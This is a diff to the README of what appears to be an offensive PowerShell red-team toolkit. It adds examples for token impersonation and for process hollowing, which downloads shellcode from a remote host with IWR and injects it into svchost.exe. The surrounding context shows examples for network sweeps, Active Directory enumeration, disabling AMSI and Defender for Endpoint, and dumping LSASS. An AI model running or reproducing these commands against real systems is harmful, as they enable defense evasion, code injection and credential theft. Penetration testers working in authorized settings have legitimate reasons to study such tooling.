@@ -25,13 +25,20 @@ Invoke-AdminCheck -h $(Invoke-PingSweep -s "172.16.75.0")
 ```
 Example of impersonation via process token then running SharpView (or sharphound) as that domain user
 ```powershell
-Invoke-TokenStealer -procH $false
+Show-AvailableTokens | Format-Table
+Invoke-ImpersonateToken -processId 7100
 
 Get-CurrentIdentity
 
 Invoke-TurtleView -c "Get-DomainComputers";
 Invoke-TurtleHound
 ```
+Example of impersonating via process token then performing process hollow as the user.
+```powershell
+$code = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
+Invoke-ImpersonateProcessHollow -processId 1092 -exe "svchost.exe" -decryptKey $code.encryptionKey -shellCode $code.encryptedShellcode -initVector $code.initVectorKey
+```
+
 Example of disabling amsi then disabling defender for endpoint and performing lsass process dump
 ```powershell
 Disable-AyEmEsEye -Verbose
@@ -79,8 +86,10 @@ Invoke-TurtleDump
 Invoke-TurtleHound
 Invoke-TurtleUp
 Invoke-TurtleView
+Invoke-ImpersonateProcessHollow
+Invoke-ImpersonateToken
+Show-AvailableTokens
 Undo-Impersonation
-
 ```
 
 ## Credits
